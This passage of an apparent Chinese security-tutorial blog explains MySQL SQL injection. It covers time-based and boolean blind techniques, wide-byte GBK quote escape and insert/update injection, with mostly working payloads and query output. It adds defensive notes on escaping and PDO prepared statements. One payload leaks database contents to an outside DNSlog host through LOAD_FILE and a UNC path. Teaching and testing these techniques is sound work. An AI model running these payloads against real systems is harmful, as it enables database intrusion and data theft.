class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>sleep()、BENCHMARK()</p></li><li><p>笛卡尔积</p><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</span><br></pre></td></tr></table></figure><p>具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。</p><p>实例：</p><p>配合if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null))</span><br></pre></td></tr></table></figure></li><li><p>Get_lock() 加锁机制</p><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p>原理：</p><p>尝试对一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">  +-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">  +-------------------------+</span><br><span class="line">  |                       1 |</span><br><span class="line">  +-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>尝试开启另一个客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.01 sec)</span><br></pre></td></tr></table></figure><p>实例：</p><p>对有一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1);</span><br></pre></td></tr></table></figure><p>再次加锁(配合if)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null);</span><br></pre></td></tr></table></figure><p>限制条件：</p><p>限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close()  关闭与数据库的连接，也就是 web  服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>其他盲注函数–mysql中用regexp是区分大小写的</p><ul><li><p>lpad和rpad函数</p><p>lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(1,5,2);</span><br><span class="line">+-------------+</span><br><span class="line">| lpad(1,5,2) |</span><br><span class="line">+-------------+</span><br><span class="line">| 22221       |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul><p>配合盲注</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(lpad(1,(select length(database())),2));</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| length(lpad(1,(select length(database())),2)) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             4 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select lpad(1,(select length(database())),2);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| lpad(1,(select length(database())),2) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| 2221                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>like和regexp:</p><p>Like:</p><p>% : 匹配0个或任意多个字符</p><p>_ : 匹配任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否是t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t%&#39;;</span><br><span class="line">+----------------------+</span><br><span class="line">| database() like &#39;t%&#39; |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>判断前两个字符是不是te</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;te%&#39;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| database() like &#39;te%&#39; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断是否包含es两个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;%es%&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;%es%&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断有几个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;_____&#39;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| database() like &#39;_____&#39; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database() like &#39;____&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;____&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t___&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;t___&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>like配合盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">+------+-----------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意点就是如果匹配成功就会返回1否则就是0。</p><p>REGEXP:</p><p>盲注值正则表达式攻击(^、&amp;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from math where id&#x3D;3;</span><br><span class="line">+-----------+</span><br><span class="line">| name      |</span><br><span class="line">+-----------+</span><br><span class="line">| chengxian |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              1 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>提高盲注速度</p><p>DNSlog+盲注</p><p><code>https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</code></p><p>原理：</p><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a></p><p>通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。</p><p>可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。<a href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息./">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。</a></p><p>在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式：  \\ComputerName\SharedFolder\Resource</span><br><span class="line"></span><br><span class="line">攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。</span><br></pre></td></tr></table></figure><p>  条件：</p><p>  1、secure_file_priv为空</p><p>  2、目标系统是windows，能够使用UNC路径</p><p>  实例：</p><p>  构造sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\abc&#39;)))</span><br></pre></td></tr></table></figure><p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p></li></ul><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p><p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p><p>应用程序的编码</p><p>以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启<code>default_charset</code>编码时，php的默认编码为空，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; PHP&#39;s built-in default is text&#x2F;html</span><br><span class="line">default_mimetype &#x3D; &quot;text&#x2F;html&quot;</span><br><span class="line">;default_charset &#x3D; &quot;iso-8859-1&quot;</span><br></pre></td></tr></table></figure><p>此时php会根据数据库中的编码自动来确定使用那种编码，可以使用<code>&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt;</code> 来进行判断，如果输出的值是3说明是<code>utf-8</code>编码。如果输出的值是2说明是<code>gbk</code>编码；</p><p><code>SET NAMES &#39;GBK&#39;</code>语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;;</span><br></pre></td></tr></table></figure><p>三个语句的作用是：</p><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p><p>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p><p>使用<code>addslashes</code>函数或是开启<code>PHPGPC</code>（注：<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure><p>比如我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27</span><br></pre></td></tr></table></figure><p>会被进行如下转换</p><p>%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ </p><p>因为数据库设置了<code>GBK</code>编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p><p>防御：</p><p>对于宽字节编码，有一种最好的修补就是：</p><p>（1）使用mysql_set_charset(GBK)指定字符集</p><p>（2）使用mysql_real_escape_string进行转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。</span><br></pre></td></tr></table></figure><p>（3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p><h4 id="PDO技术"><a href="#PDO技术" class="headerlink" title="PDO技术"></a>PDO技术</h4><p>mysql的预编译</p><p>当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL<br>语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>模拟预处理</p><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行</p><p>模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p><p>非模拟预处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PDO::ATTR_EMULATE_PREPARES =&gt; <span class="literal">false</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = [</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, $params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $link = $db-&gt;prepare(<span class="string">&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">    var_dump($e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程，</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。</p><p>预编译可以完全杜绝注入攻击吗</p><p>在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。</p><p>总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用PDO时尽量使用非模拟预处理。</span><br><span class="line">2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。</span><br><span class="line">3、SQL语句模板不使用变量动态拼接生成</span><br></pre></td></tr></table></figure><p>关于orderby不能参数化查询的问题</p><p>原因：</p><ul><li><p>order by后面拼接字段名，字段名不能加引号。</p></li><li><p>在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。</p></li></ul><h5 id="insert、update注入"><a href="#insert、update注入" class="headerlink" title="insert、update注入"></a>insert、update注入</h5><h6 id="利用报错注入"><a href="#利用报错注入" class="headerlink" title="利用报错注入"></a>利用报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句</span><br><span class="line"> or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- </span><br></pre></td></tr></table></figure><h6 id="无回显注入-盲注"><a href="#无回显注入-盲注" class="headerlink" title="无回显注入(盲注)"></a>无回显注入(盲注)</h6><ul><li><p>利用xor、||、&amp;&amp;、+,-,*,/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (sleep(10));</span><br><span class="line">+-------------+</span><br><span class="line">| (sleep(10)) |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.09 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.01 sec)</span><br></pre></td></tr></table></figure><p>配合if、substr等函数进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (10.00 sec)</span><br></pre></td></tr></table></figure></li></ul><h6 id="有回显注入-符号"><a href="#有回显注入-符号" class="headerlink" title="有回显注入(符号)"></a>有回显注入(符号)</h6><ul><li><p>实例：</p><p>按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。</p><p>这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 